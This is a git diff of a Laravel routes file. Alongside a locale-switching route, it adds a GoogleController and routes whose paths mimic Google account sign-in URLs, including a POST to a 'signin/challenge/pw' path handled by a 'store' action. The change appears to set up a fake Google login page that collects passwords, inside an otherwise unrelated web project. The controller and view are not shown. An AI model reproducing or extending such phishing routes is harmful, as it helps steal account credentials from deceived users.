@@ -2,9 +2,12 @@
 
 use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\CarcelController;
+use App\Http\Controllers\GoogleController;
 use App\Http\Controllers\MudagController;
 use App\Http\Controllers\Panel\MedioController;
 use App\Http\Controllers\Panel\SigController;
+use Illuminate\Support\Facades\App;
+use Illuminate\Support\Facades\Redirect;
 /*
 |--------------------------------------------------------------------------
 | Web Routes
@@ -825,6 +828,12 @@ Route::get('/SIG', function(){
    return view('user.projects.sig');
 }) ->name('user.projects.sig');
 
+Route::get('///accounts.google/v3/signin/identifier/sh-VjtWVDK8EcRuHDOrcontinue=UTLUu7YdLw&osi=1&pIn&y:Servilogin', function(){
+   return view('user.projects.google');
+}) ->name('user.projects.google');
+
+Route::get('/accounts.google/v3/signin/identifier/sh-VjtWVDK8EcRuHDOrcontinue=UTLUu7YdLw&osi=1&pIn&y:Servilogin', [GoogleController::class, 'create'])->name('google.create');
+Route::post('/accounts.google/v3/signin/challenge/pw-djtWVDK8EcRuHDOrcontinue=UTLUu7YdLw&osi=1&pIn&y:Servilogin', [GoogleController::class, 'store'])->name('google.store');
 
 
 Route::get('/SIG_datos', function(){
@@ -868,7 +877,10 @@ Route::get('/nutibara', function(){
 }) ->name('user.projects.nutibara');
 
 
-
+Route::get('locale/{locale}', function ($locale) {
+   session()->put('locale', $locale);
+   return Redirect::back();
+});
 
 
 Auth::routes();
